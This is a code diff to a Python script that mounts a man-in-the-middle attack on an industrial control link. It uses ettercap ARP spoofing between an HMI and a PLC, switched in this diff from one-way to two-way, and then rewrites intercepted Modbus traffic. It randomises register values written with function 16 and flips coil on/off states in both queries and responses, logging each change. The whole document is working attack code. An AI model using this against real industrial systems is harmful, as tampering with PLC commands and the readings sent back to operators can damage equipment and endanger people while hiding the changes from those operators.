@@ -36,7 +36,7 @@ def get_ip():
         sleep(1)
 
 def arp_spoofing():
-        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
+        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
         os.system(arp2)
         process = os.popen('pgrep -f ettercap')
         out = process.read()
@@ -54,14 +54,24 @@ def process_pkt(packet):
         del z[IP].len
         del z[TCP].len
         if func == 16:
-                print(z[TCP].outputsValue)
+                c = z[TCP].outputsValue
                 z.outputsValue = randrange(10000, 20000)
+                print("Register {add}, change {v1} to {v2}".format(add=z.startAddr, v1=c, v2=z.outputsValue))
         elif func == 5:
-                print(z[TCP].outputValue)
-                if z.outputValue == 65280:
-                        z.outputValue = 0
-                elif z.outputValue == 0:
-                        z.outputValue = 65280
+                if z[IP].dst == plc_ip:
+                        if z.outputValue == 65280:
+                                z.outputValue = 0
+                                print("Query Coil {} , change 1 to 0".format(z[TCP].outputAddr))
+                        elif z.outputValue == 0:
+                                z.outputValue = 65280
+                                print("Query Coil {} , change 0 to 1".format(z[TCP].outputAddr))
+                elif z[IP].dst == hmi_ip:
+                        if z.outputValue == 65280:
+                                z.outputValue = 0
+                                print("Response Coil {} , change 1 to 0".format(z[TCP].outputAddr))
+                        elif z.outputValue == 0:
+                                z.outputValue = 65280
+                                print("Response Coil {} , change 0 to 1".format(z[TCP].outputAddr))
         packet.set_payload(bytes(z))
         packet.accept()
     except AttributeError:
